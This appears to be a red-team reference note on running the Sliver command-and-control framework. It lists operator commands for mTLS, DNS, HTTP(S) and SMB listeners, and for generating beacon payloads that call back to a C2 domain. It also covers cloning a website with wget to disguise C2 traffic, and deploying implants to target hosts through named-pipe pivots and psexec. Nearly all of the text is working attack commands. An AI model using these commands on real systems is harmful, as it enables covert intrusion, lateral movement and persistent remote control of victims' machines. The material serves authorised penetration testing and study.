---
author(s):
  - Userware
tags:
  - red-team-infrastructure
  - command-and-control
  - sliver
---
# Sliver

## 01 - Shell Handler

### 1.1 - TCP

```
sliver > mtls -L <IP> -l <PORT>
```

### 1.2 - DNS

```
sliver > dns -d <domain>
```

```
sliver > generate beacon –dns c2.cyber.cossacks --seconds 10 --jitter 0 --save /tmp/dns.exe
```

### 1.3 - HTTP(S)

#### 1.3.1 - TLS Certificate

> [!TIP]
> This is optional but recommended for OPSEC.

Encrypted TLS key and certification.

```
$ openssl req -x509 -newkey rsa:4096 -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email>" -keyout private.key -out certificate.crt -sha256 -days 365
```

Non-encrypted TLS key and certification.

```
$ openssl req -new -x509 -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email>" -keyout private.key -out certificate.crt -days 365 -nodes

sliver > http [-d <domain.com>] -L <IP> -l <PORT>

sliver > https [-d <domain.com>] -L <IP> -l <PORT> -c /path/to/certificate.crt -k /path/to/private.key
```

#### 1.3.2 - Disguise Network Traffic

> [!TIP]
> This is strongly recommended to disguise the traffic.

Clone the website.

```
$ wget --directory-prefix=/root/Desktop/ --header="Accept: text/html" \
-U "(Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6" \
-e robots=off --recursive --no-clobber --page-requisites --html-extension \
--convert-links -R gif,jpg,png,css,pdf,mp3,wmv --domains test.com <URL>
```

Then specify the path and here's an example.

```
sliver > websites add-content -w -p /index.html -c /home/user/nginx_error.html

sliver > http -w error [-d <domain.com>] -L <IP> -l <PORT>

sliver > websites rm-content -w error -p /index.html
```

### 1.4 - SMB

```
sliver > pivots named-pipe -b <pipe_name>

sliver > profiles new [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -l -a x64 -o windows -f service <profile_name>

sliver > psexec -d "<service_description>" -s <service_name> -b C:\path\to\directory -p <profile_name> <target_IP>
```

You can use a custom payload.

```
sliver > generate [beacon] [-S <seconds>] [-J <seconds>] -p namedpiped://<compromised_IP>/./pipe/<name_pipe> -a x64 -o windows -f service -s /path/to/folder

sliver > psexec -d "<service_description>" -s <service_name> -b C:\path\to\directory -c /path/to/payloadsvc.exe -p <profile_name> <target_IP>
```

## 02 - Interact Implants

Interact a long beacon or session ID string.

```
sliver > use <beacon_or_session_ID>
```

## 03 - Terminate Implant

Close an interactive session without killing the remote process

```
sliver (IMPLANT_NAME) > close
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/D - Webapp Pentesting/0x03 - Bypass Webapp Security/Web Application Firewall (WAF)/Helpers/User Agents|Webapp Pentesting: User Agents]]